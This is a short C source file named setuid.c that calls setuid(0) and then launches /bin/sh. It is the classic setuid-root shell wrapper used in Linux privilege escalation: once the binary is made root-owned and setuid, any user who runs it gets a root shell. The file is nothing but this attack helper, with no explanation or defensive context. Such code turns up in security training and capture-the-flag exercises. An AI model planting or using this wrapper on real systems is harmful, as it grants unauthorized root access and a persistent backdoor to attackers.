/* setuid.c */
#include <unistd.h>
#include <stdlib.h>
void main()
{
	setuid(0);
	system("/bin/sh");
}

